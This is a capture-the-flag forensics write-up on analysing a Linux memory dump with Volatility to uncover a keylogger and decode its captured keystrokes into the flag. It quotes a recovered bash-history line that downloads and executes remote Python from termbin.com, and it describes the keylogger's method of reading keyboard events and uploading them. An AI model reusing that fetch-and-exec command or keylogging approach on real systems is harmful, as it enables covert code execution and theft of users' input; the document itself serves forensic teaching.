---
title: The Big Score - InCTF Internationals 2021
date: 2021-08-20 12:00:00
author: d3liri0us
author_url: https://twitter.com/d3liri0us_
categories:
  - Forensics
  - Memory
tags:
  - Memory
  - Linux
  - InCTFi
---

**tl;dr**

+ Create a Linux profile for Ubuntu 18.04 (5.4.0-42-generic) in Volatility
+ Use `linux_bash` plugin to get link to the repo and `linux_find_file` plugin to recover the filepath
+ Decode the keyboard stream data to retrieve the flag

<!--more-->

**Challenge Points:** 956
**No of Solves:** 11
**Challenge Author:** [d3liri0us](https://twitter.com/d3liri0us_)

## Challenge Description

`We sent Michael over to the Union Depository to collect data from one of their systems for the heist. We were able to retrieve the data, but it looks like they were able to read the message sent to us that Michael had typed from their system. Fortunately, he took the memory dump before escaping the building. Analyze the memory dump and find out how the message was compromised.`

## Initial Analysis

The handout contains a [lime](https://github.com/504ensicsLabs/LiME) file which is basically a Linux memory dump. For analysis, we will be using [volatility](https://github.com/volatilityfoundation/volatility) and work our way to build and load the Linux profile.


### Building the Linux Profile

In order to start off with the challenge, we need to build a Linux profile for Volatility so that it can parse information from the memory dump. A Linux profile is basically a zip file with information on the kernel's data structures and debug symbols.

To build the Linux profile, we need to identify the Linux version of the system. There are a couple of ways to do it but we will be using `strings` in this case.

```
strings the_big_score.lime | grep 'Linux version'
```

This will give out the following string:

```
Linux version 5.4.0-42-generic (buildd@lgw01-amd64-023) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #46~18.04.1-Ubuntu SMP Fri Jul 10 07:21:24 UTC 2020 (Ubuntu 5.4.0-42.46~18.04.1-generic 5.4.44)
```

From the above result, the Linux version is Ubuntu 18.04 (5.4.0-42-generic)

Now we need to build a system with the same Linux version (basically host a VM) and follow the steps mentioned [here](https://github.com/volatilityfoundation/volatility/wiki/Linux) in order to build the Linux profile.

### Exploring the memory dump

After creating the Linux profile, we can start using volatility plugins for further analysis.
+ Using `linux_bash` plugin, it's possible to recover the bash history from the memory dump.

```
python vol.py -f the_big_score.lime --profile=LinuxUbuntu1804x64 linux_bash
```

This will yield us a few results, but the stuff we are interested in is:

```
2683 bash                 2021-08-07 13:11:08 UTC+0000   python -c "import urllib2;exec(urllib2.urlopen('https://termbin.com/ab9v').read())"
```

+ Looking into the link, we find it's a base64 encoded executable file. The command basically executes the executable file without the executable being stored in the system. The process can only be detected when it is running in the memory.
+ Decoding the base64 encoded executable, it's pretty easy to understand what it does by looking at the strings. It clones a git repo, executes the python script and then removes the repo from the system. (Alternate : Dumping the malicious process, we can directly get the executable and read the strings)
+ Analyzing the code given in the repo, it basically reads data from `/dev/input/event2`, encodes it into hex and uploads it to termbin. The filepath for `termbin.com` is hashed, reversed and stored in `bin/log` along with random hashes.
+ The next step is to figure out how to extract `bin/log` and get the hash. For this, we will be using `linux_enumerate_files` plugin along with `grep` to figure out the inode number of the file.

```
python vol.py -f the_big_score.lime --profile=LinuxUbuntu1804x64 linux_enumerate_files | grep 'bin/log'
```

Output :

```
0xffff8aa80573b890                    930908 /home/user420/bin/log
```

Now that we have the inode number, we can use `linux_find_file` plugin to extract the file from the memory dump.

```
python vol.py -f the_big_score.lime --profile=LinuxUbuntu1804x64 linux_find_file -i 0xffff8aa80573b890 -O log
```

+ The specific hash that we are looking for is : `0bb3dfada523c1a14c3224849368e9ff`
+ After reversing, we get `v61x` on cracking the hash. This gives us the full link : `https://termbin.com/v61x` (Alternate : Since the whole process is recorded in the memory and knowing that the output consists of `https://termbin.com/`, doing a simple `grep` on the lime file will get us the link)

### Decoding the keyboard stream data

+ As mentioned before, the data uploaded to the termbin is hex-encoded data of `/dev/input/event2` wherein `event2` is the event handler for keyboard in this case.
+ Convert the hex-encoded data back to it's original data using `xxd -r -p v61x.data key.data`.
+ Now we have to decode the keyboard stream data. For that, it is recommended to visit this [site](https://thehackerdiary.wordpress.com/2017/04/21/exploring-devinput-1/) for understanding the concept.
+ The script for decoding mentioned over here does not print out the flag but rather prints the result showing the press/release mechanism of the keystrokes for better understanding. Using the following python script and [dictionary](https://pastebin.com/PLSDDhNw):
```py
from dictionary import keyvalues
import struct,os,sys

f = open("key.data","rb")
data = []
keystrokes = ''

while True:

    try:
        data.append(str(list(struct.unpack('4IHHI',f.read(24)))[6]))
    except:
        for i in range(len(data)):
            try:
                if i%3 == 0:
                    if data[i+1] == '1' or data[i+1] == '2': # Value '1' denotes the key is pressed and Value '2' denotes the key hasn't been released
                        keystrokes += keyvalues[data[i]]+'+'
                    else:                                    # Value '0' denotes the key has been released
                        keystrokes += keyvalues[data[i]]+' '
            except:
                print(keystrokes)
                exit()
```
It will generate the following output:

```
[LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+i+i [LEFT_SHIFT] [SPACE]+[SPACE] h+h a+a v+v e+e [SPACE]+[SPACE] a+a l+l l+l [SPACE]+[SPACE] t+t h+h e+e [SPACE]+[SPACE] d+d a+a t+t a+a [SPACE]+[SPACE] n+n e+e e+e d+d e+e d+d [SPACE]+[SPACE] f+f o+o r+r [SPACE]+[SPACE] t+t h+h e+e [SPACE]+[SPACE] h+h e+e i+i s+s t+t .+. [SPACE]+[SPACE] [LEFT_SHIFT]+[LEFT_SHIFT]+t+t [LEFT_SHIFT] r+r e+e v+v o+o r+r [SPACE]+[SPACE] c+c a+a n+n [SPACE]+[SPACE] h+h a+a n+n d+d l+l e+e [SPACE]+[SPACE] t+t h+h e+e [SPACE]+[SPACE] g+g u+u n+n s+s [SPACE]+[SPACE] a+a n+n d+d [SPACE]+[SPACE] [LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+f+f [LEFT_SHIFT] r+r a+a n+n k+k l+l i+i n+n [SPACE]+[SPACE] w+w i+i l+l l+l [SPACE]+[SPACE] b+b e+e [SPACE]+[SPACE] o+o n+n [SPACE]+[SPACE] t+t h+h e+e [SPACE]+[SPACE] g+g e+e t+t a+a w+w a+a y+y [SPACE]+[SPACE] v+v e+e h+h i+i c+c l+l e+e .+. [SPACE]+[SPACE] [LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+i+i [LEFT_SHIFT] t+t [SPACE]+[SPACE] f+f e+e e+e l+l s+s [SPACE]+[SPACE] g+g o+o o+o d+d [SPACE]+[SPACE] t+t o+o [SPACE]+[SPACE] s+s a+a y+y [SPACE]+[SPACE] t+t h+h a+a t+t [SPACE]+[SPACE] i+i n+n c+c t+t f+f [LEFT_SHIFT]+[+[ [LEFT_SHIFT] t+t h+h 1+1 s+s [LEFT_SHIFT]+[LEFT_SHIFT]+-+- [LEFT_SHIFT] 1+1 s+s [LEFT_SHIFT]+[LEFT_SHIFT]+-+- [LEFT_SHIFT] t+t h+h e+e [LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+-+- [LEFT_SHIFT] b+b 1+1 g+g [LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+-+- [LEFT_SHIFT] o+o [LEFT_SHIFT]+[LEFT_SHIFT]+n+n [LEFT_SHIFT] e+e [LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+-+- [LEFT_SHIFT] l+l e+e s+s t+t e+e r+r [LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+[LEFT_SHIFT]+]+] [LEFT_SHIFT] [ENTER]+[ENTER]
```

In order to understand the output, there are a couple of things to remember:
+ Every press/release is recorded in the following format:
```
[1628341964, 0, 607671, 0, 4, 4, X]
[1628341964, 0, 607671, 0, 1, X, Y]
[1628341964, 0, 607671, 0, 0, 0, 0]
```
+ In the format, `X` is value of the key on the keyboard.
+ The course of action, `Y` can take three values which are `0`(Key is released), `1`(Key is pressed) and `2`(Key is not released).
+ The output generated by the script is in such a way that for `Y` = `1` or `2`, it will print `keyvalues[X]+` and for `Y` = `0`, it will print `keyvalues[X]`.
+ For example if the output is `a+a`, it means key `A` is pressed and released so the result will be `a`. If the output is like `[LEFT_SHIFT]+a+a [LEFT_SHIFT] `, it means `Left Shift` is pressed, key `A` is pressed and released and then `Left Shift` is released which will result into `A` as the output. If the output is like `[LEFT_SHIFT]+[LEFT_SHIFT]+`, it simply means that `Left Shift` key is pressed and not released since the event records it as `Y` = `2` in this case.
+ Understanding the functionality, we can apply those changes to the script in order to get the following output:

```
I have all the data needed for the heist. Trevor can handle the guns and Franklin will be on the getaway vehicle. It feels good to say that inctf{th1s_1s_the_b1g_oNe_lester}
```

## Flag
```
inctf{th1s_1s_the_b1g_oNe_lester}
```

I hope you guys had fun and learnt something new from the challenge, I learnt some new stuff (and experienced pain :P) while making it. Feel free to reach out to me on [Twitter](https://twitter.com/d3liri0us_) for any questions/queries regarding this challenge.
